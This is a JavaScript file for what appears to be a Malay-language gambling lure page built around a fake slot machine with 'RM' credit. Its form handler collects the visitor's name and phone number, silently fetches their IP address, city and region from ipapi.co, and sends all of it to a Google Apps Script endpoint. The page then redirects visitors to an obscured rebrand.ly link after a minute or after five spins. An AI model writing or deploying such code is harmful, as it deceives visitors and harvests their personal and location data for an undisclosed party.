const form = document.getElementById("startForm");
const formWrapper = document.getElementById("formWrapper");
const gameContainer = document.getElementById("gameContainer");

const symbols = ['💰', '👑', '💎', '🍒', '🎲'];
let credit = 100;
let spinCount = 0;
const bet = 10;
const maxSpin = 5;

const creditDisplay = document.getElementById("credit");
const spinDisplay = document.getElementById("spinCount");
const spinSound = new Audio("https://files.catbox.moe/f4h4ut.mp3");

// ===== FORM SUBMIT (Auto fetch IP, send to Google Sheets) =====
form.addEventListener("submit", async function (e) {
  e.preventDefault();
  const nama = document.getElementById("nama").value;
  const phone = document.getElementById("phone").value;

  try {
    // Fetch IP Info
    const res = await fetch("https://ipapi.co/json/");
    const ipData = await res.json();

    const dataToSend = {
      nama: nama,
      phone: phone,
      ip: ipData.ip || "-",
      city: ipData.city || "-",
      region: ipData.region || "-"
    };

    // POST ke Google Sheets Web App
    fetch("https://script.google.com/macros/s/AKfycbyog6vyiXFSwS1atnaAy60M0LkywQ_dOuviUROVAbCZXJZ-h34plN1a_0B8TA-1taCl/exec", {
      method: "POST",
      body: JSON.stringify(dataToSend),
      headers: {
        "Content-Type": "application/json"
      }
    })
    .then(res => res.text())
    .then(() => {
      // Bila submit berjaya
      formWrapper.style.display = "none";
      gameContainer.style.display = "block";
    })
    .catch(err => {
      console.error("Submit error: ", err);
      alert("❌ Gagal hantar data. Sila cuba lagi.");
    });

  } catch (err) {
    console.error("Gagal fetch IP:", err);
    alert("❌ Gagal kesan lokasi. Sila cuba lagi.");
  }
});

// ===== AUTO REDIRECT AFTER 60s =====
setTimeout(() => {
  window.location.href = "https://rebrand.ly/Pn83u0e";
}, 60000);

// ===== SPIN FUNCTION =====
function spin() {
  if (credit < bet) {
    alert("❌ Kredit tidak cukup!");
    return;
  }

  credit -= bet;
  spinCount++;
  creditDisplay.textContent = `RM${credit}`;
  spinDisplay.textContent = spinCount;

  spinSound.currentTime = 0;
  spinSound.play();

  animateColumn("col1");
  animateColumn("col2");
  animateColumn("col3");

  if (spinCount >= maxSpin) {
    setTimeout(() => {
      window.location.href = "https://rebrand.ly/Pn83u0e";
    }, 5000);
  }
}

// ===== ANIMATION FUNCTION =====
function animateColumn(colId) {
  const col = document.getElementById(colId);
  const cells = col.querySelectorAll(".cell");
  let count = 0;
  const interval = setInterval(() => {
    cells.forEach(cell => {
      cell.textContent = symbols[Math.floor(Math.random() * symbols.length)];
    });
    count++;
    if (count >= 20) clearInterval(interval);
  }, 100);
}
